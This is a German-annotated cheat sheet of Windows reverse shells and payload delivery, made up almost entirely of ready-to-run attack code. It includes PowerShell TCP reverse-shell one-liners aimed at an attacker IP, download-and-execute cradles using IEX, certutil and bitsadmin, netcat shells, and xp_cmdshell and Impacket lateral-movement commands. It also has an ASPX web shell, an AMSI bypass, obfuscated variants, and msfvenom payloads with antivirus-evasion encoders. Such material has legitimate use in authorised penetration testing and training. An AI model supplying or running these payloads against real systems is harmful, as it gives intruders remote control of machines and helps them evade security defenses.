# Alternative Reverse Shells - Windows

## 1. PowerShell Reverse Shells

### 1.1 Classic One-Liner (Most Reliable)

```powershell
# Basic Version
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Mit -ExecutionPolicy Bypass
powershell -nop -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Hidden Window
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 1.2 Base64 Encoded PowerShell

```bash
# Payload erstellen
echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf-16le | base64 -w 0

# Ausführen (encoded command)
powershell -nop -enc <BASE64_STRING>
```

### 1.3 Download & Execute PowerShell

```powershell
# Nishang Invoke-PowerShellTcp.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"

# Kürzere Variante
powershell -c "IEX(iwr http://10.10.10.10/shell.ps1)"

# Mit UseBasicParsing (falls IE nicht initialisiert)
powershell -c "IEX(iwr http://10.10.10.10/shell.ps1 -UseBasicParsing)"
```

### 1.4 PowerShell via CMD.exe

```cmd
cmd.exe /c powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 2. File Download Methods

### 2.1 Invoke-WebRequest (PowerShell)

```powershell
# Lange Version
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10/nc.exe' -OutFile 'C:\Windows\Temp\nc.exe'"

# Kurze Version (iwr)
powershell -c "iwr 'http://10.10.10.10/nc.exe' -o 'C:\Windows\Temp\nc.exe'"

# Mit UseBasicParsing
powershell -c "iwr 'http://10.10.10.10/nc.exe' -o 'C:\Temp\nc.exe' -UseBasicParsing"

# Download & Execute
powershell -c "iwr 'http://10.10.10.10/shell.exe' -o 'C:\Temp\s.exe'; C:\Temp\s.exe"
```

### 2.2 Net.WebClient (PowerShell)

```powershell
# DownloadFile Methode
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/nc.exe', 'C:\Temp\nc.exe')"

# DownloadString (für Scripts)
powershell -c "$c = New-Object Net.WebClient; $c.DownloadString('http://10.10.10.10/shell.ps1') | IEX"

# Mit Proxy Credentials (falls nötig)
powershell -c "$wc = New-Object Net.WebClient; $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; $wc.DownloadFile('http://10.10.10.10/nc.exe', 'C:\Temp\nc.exe')"
```

### 2.3 Certutil

```cmd
# HTTP Download
certutil -urlcache -f http://10.10.10.10/nc.exe C:\Temp\nc.exe

# Base64 Decode (wenn File base64 encoded)
certutil -decode encoded.txt decoded.exe

# Split Download (bei Firewall-Restriktionen)
certutil -urlcache -split -f http://10.10.10.10/nc.exe C:\Temp\nc.exe
```

### 2.4 BITSAdmin

```cmd
# Basic Download
bitsadmin /transfer myjob /download /priority normal http://10.10.10.10/nc.exe C:\Temp\nc.exe

# Mit /priority high
bitsadmin /transfer download /priority high http://10.10.10.10/shell.exe C:\Windows\Temp\shell.exe

# Multiple Files
bitsadmin /create download
bitsadmin /addfile download http://10.10.10.10/nc.exe C:\Temp\nc.exe
bitsadmin /addfile download http://10.10.10.10/shell.exe C:\Temp\shell.exe
bitsadmin /resume download
bitsadmin /complete download
```

### 2.5 cURL & Wget (Windows 10+)

```cmd
# cURL (ab Windows 10 Build 1803)
curl http://10.10.10.10/nc.exe -o C:\Temp\nc.exe

# Wget (falls installiert)
wget http://10.10.10.10/nc.exe -O C:\Temp\nc.exe
```

---

## 3. CMD/Batch Reverse Shells

### 3.1 Netcat Reverse Shell

```cmd
# Traditional nc.exe
nc.exe -e cmd.exe 10.10.10.10 4444

# Mit UNC Path (von SMB Share)
\\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10 4444
```

### 3.2 MSFVenom Batch Payload

```bash
# Auf Kali: Batch File mit PowerShell Reverse Shell
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4444 > shell.bat

# Windows: Ausführen
cmd.exe /c shell.bat
```

### 3.3 CMD Reverse Shell (ohne nc)

```cmd
# Über named pipes (selten funktionsfähig)
cmd.exe | \\10.10.10.10\pipe\tmp

# Über PowerShell aus CMD
cmd.exe /c powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);..."
```

---

## 4. Context-Specific Payloads

### 4.1 xp_cmdshell (MSSQL)

```sql
-- PowerShell One-Liner
xp_cmdshell "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""

-- Download & Execute
xp_cmdshell 'powershell -c "iwr http://10.10.10.10/nc.exe -o C:\Temp\nc.exe"'
xp_cmdshell 'C:\Temp\nc.exe -e cmd.exe 10.10.10.10 4444'

-- Certutil Download
xp_cmdshell 'certutil -urlcache -f http://10.10.10.10/nc.exe C:\Temp\nc.exe'
```

### 4.2 Impacket atexec.py

```bash
# PowerShell Download
atexec.py DOMAIN/user:password@192.168.10.10 "powershell -c \"iwr 'http://10.10.10.10/nc.exe' -o 'C:\Windows\Temp\nc.exe'\""

# Execute Downloaded Binary
atexec.py DOMAIN/user:password@192.168.10.10 "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.10.10 4444"

# Direct PowerShell Reverse Shell (short version)
atexec.py user:pass@target "powershell -c IEX(iwr http://10.10.10.10/shell.ps1)"
```

### 4.3 PSExec / WMI / WinRM

```bash
# PSExec (Impacket)
psexec.py DOMAIN/user:password@192.168.10.10 "cmd.exe /c powershell -c IEX(iwr http://10.10.10.10/shell.ps1)"

# WMIExec (Impacket)
wmiexec.py DOMAIN/user:password@192.168.10.10 "powershell -c iwr http://10.10.10.10/nc.exe -o C:\Temp\nc.exe"

# Evil-WinRM (wenn WinRM verfügbar)
evil-winrm -i 192.168.10.10 -u user -p password
# Dann: upload nc.exe
# Dann: .\nc.exe -e cmd.exe 10.10.10.10 4444
```

### 4.4 Web Shells (ASP/ASPX)

```aspx
<!-- ASP.NET Web Shell mit PowerShell -->
<%@ Page Language="C#" %>
<%
    System.Diagnostics.Process.Start("powershell.exe", "-nop -c \"IEX(iwr http://10.10.10.10/shell.ps1)\"");
%>
```

---

## 5. Advanced & Evasion Techniques

### 5.1 AMSI Bypass + Reverse Shell

```powershell
# AMSI Bypass (vor Reverse Shell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Danach Reverse Shell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/shell.ps1')
```

### 5.2 Obfuscated PowerShell

```powershell
# Variable Namen obfusciert
$a='10.10.10.10';$b=4444;$c=New-Object System.Net.Sockets.TCPClient($a,$b);$d=$c.GetStream();[byte[]]$e=0..65535|%{0};while(($f=$d.Read($e,0,$e.Length)) -ne 0){;$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0,$f);$h=(iex $g 2>&1|Out-String);$i=$h+'PS '+(pwd).Path+'> ';$j=([text.encoding]::ASCII).GetBytes($i);$d.Write($j,0,$j.Length);$d.Flush()};$c.Close()
```

### 5.3 TCP Client Alternative (System.Net)

```powershell
# Alternative mit TCPClient
$client=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$stream=$client.GetStream();$writer=New-Object IO.StreamWriter($stream);$buffer=New-Object Byte[] 1024;$encoding=New-Object Text.AsciiEncoding;do{$writer.Write('PS '+(Get-Location).Path+'> ');$writer.Flush();$read=$null;while($stream.DataAvailable -or $read -eq $null){$read=$stream.Read($buffer,0,1024)};$out=$encoding.GetString($buffer,0,$read).Replace('`r`n','').Replace('`n','');if($out -ne ''){$args=$out.Split(' ');$cmd=$args[0];$cmdargs=$args[1..($args.Length-1)] -join ' ';if($cmd -eq 'exit'){break}else{$out=try{Invoke-Expression "$cmd $cmdargs"|Out-String}catch{$_.Exception.Message};$writer.WriteLine($out)}}}while($client.Connected);$writer.Close();$client.Close()
```

### 5.4 Nishang Reverse Shells

```bash
# Auf Kali: Nishang clonen
git clone https://github.com/samratashok/nishang.git

# Invoke-PowerShellTcp.ps1 verwenden
# In der Datei ans Ende hinzufügen:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Dann auf Target:
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
```

---

## 6. Binary Payloads (Batch-generiert)

### 6.1 MSFVenom Windows Payloads

```bash
# Windows x64 reverse TCP (ohne Encoder)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# Windows x64 Meterpreter reverse TCP
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o meterpreter.exe

# Windows x64 reverse HTTPS Meterpreter
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o win64https.exe

# Windows x86 mit Encoder (AV Evasion)
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe

# PowerShell Format (base64 encoded)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f psh -o payload.ps1

# C Format (für Custom Loader)
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c

# DLL Format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o shell.dll
```

### 6.2 Custom AV Bypass Template

```bash
# Template erstellen (von Kali)
cp /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c .

# Modifizieren (Add your evasion techniques)
nano template.c

# Kompilieren mit mingw
i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe

# Mit MSFVenom Payload injizieren
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -x avbypass.exe -f exe -o final.exe
```

---

## 7. Listener Setup (Kali)

```bash
# Netcat Listener
nc -lvnp 4444

# Rlwrap für bessere Shell (mit History)
rlwrap nc -lvnp 4444

# Metasploit Multi/Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit"

# Ncat (Nmap) mit SSL
ncat --ssl -lvnp 4444
```

---

## 8. Quick Reference Table

| Method | Command | Use Case |
|--------|---------|----------|
| PowerShell One-Liner | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',4444)..."` | Direct command execution |
| Download & Execute | `iwr 'http://IP/nc.exe' -o 'C:\Temp\nc.exe'; C:\Temp\nc.exe -e cmd.exe IP 4444` | File upload + execute |
| Certutil Download | `certutil -urlcache -f http://IP/nc.exe C:\Temp\nc.exe` | Legacy systems |
| BITSAdmin | `bitsadmin /transfer job /download /priority normal http://IP/nc.exe C:\Temp\nc.exe` | Stealth download |
| Base64 Encoded | `powershell -nop -enc <BASE64>` | Obfuscation |
| xp_cmdshell | `xp_cmdshell 'powershell -c IEX(...)'` | MSSQL exploitation |
| Nishang | `IEX(iwr http://IP/Invoke-PowerShellTcp.ps1)` | Feature-rich shell |

---

## 9. Troubleshooting

| Problem | Lösung |
|---------|--------|
| "Execution Policy" Error | Add `-ExecutionPolicy Bypass` or `-ep bypass` |
| AMSI Detection | Add AMSI bypass before payload |
| Firewall blocks outbound | Try HTTPS (443), DNS tunneling, or ICMP |
| No output from xp_cmdshell | Redirect output: `command > C:\Temp\out.txt` then read file |
| AV Detection | Use obfuscation, encoding, or custom payloads |
| PowerShell not available | Use CMD-based methods or upload binary |

---

## 10. Resources

- **Nishang**: https://github.com/samratashok/nishang
- **Invoke-Obfuscation**: https://github.com/danielbohannon/Invoke-Obfuscation
- **PowerSploit**: https://github.com/PowerShellMafia/PowerSploit
- **Unicorn**: https://github.com/trustedsec/unicorn (PowerShell + Meterpreter)
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
